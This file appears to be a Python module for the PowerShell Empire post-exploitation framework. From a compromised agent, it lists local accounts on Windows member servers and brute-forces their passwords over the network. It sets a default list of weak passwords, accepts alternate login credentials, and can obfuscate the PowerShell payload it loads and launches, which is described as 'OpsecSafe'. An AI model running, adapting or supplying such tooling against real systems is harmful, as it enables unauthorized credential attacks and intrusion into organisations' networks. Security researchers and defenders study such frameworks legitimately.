from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers

class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Fetch local accounts on a member server and perform an online brute force attack',

            # list of one or more authors for the module
            'Author': ['Maarten Hartsuijker','@classityinfosec'],

            # more verbose multi-line description of the module
            'Description': ('This module will logon to a member server using the agents account or a provided account, fetch the local accounts and perform a network based brute force attack.'),

            # True if the module needs to run in the background
            'Background' : True,

            # True if we're saving the output as a file
            'SaveOutput' : False,

            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'Inspired by Xfocus X-Scan. Recent Windows versions won\'t allow you to query userinfo using regular domain accounts, but on 2003/2008 member servers, the module might prove to be useful.'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run the module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Loginacc' : {
                # The 'Loginacc' is used to logon with alternate credentials
                'Description'   :   'Allows you to query the servers using credentials other than the credentials the agent is running as',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Loginpass' : {
                # The 'Loginpass' comes with Loginacc
                'Description'   :   'The password that comes with Loginacc',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServerType' : {
                # The 'ServerType' option allows you to narrow down the scope. It defaults to all windows servers
                'Description'   :   'Allows you to narrow down the scope. It defaults to all windows servers.',
                'Required'      :   False,
                'Value'         :   'Window*Server*'
            },
            'Passlist' : {
                # The 'Passlist' option allows you to specify the passwords you want to test
                'Description'   :   'Comma seperated password list that should be tested against each account found',
                'Required'      :   True,
                'Value'         :   'Welcome123,Password01,Test123!,Welcome2018'
            },
            'Verbose' : {
                # The 'Verbose' option returns more query results
                'Description'   :   'Want to see failed logon attempts? And found users? Set this to any value.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu


        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):


        Passlist = self.options['Passlist']['Value']
        Verbose = self.options['Verbose']['Value']
        ServerType = self.options['ServerType']['Value']
        Loginacc = self.options['Loginacc']['Value']
        Loginpass = self.options['Loginpass']['Value']
        print(helpers.color("[+] Initiated using passwords: " + str(Passlist)))


        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/recon/Fetch-And-Brute-Local-Accounts.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = " Fetch-Brute"
        if len(ServerType) >= 1:
            scriptEnd += " -st "+ServerType
        scriptEnd += " -pl "+Passlist
        if len(Verbose) >= 1:
            scriptEnd += " -vbse "+Verbose
        if len(Loginacc) >= 1:
            scriptEnd += " -lacc "+Loginacc
        if len(Loginpass) >= 1:
            scriptEnd += " -lpass "+Loginpass


        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        print(helpers.color("[+] Command: " + str(scriptEnd)))
        return script
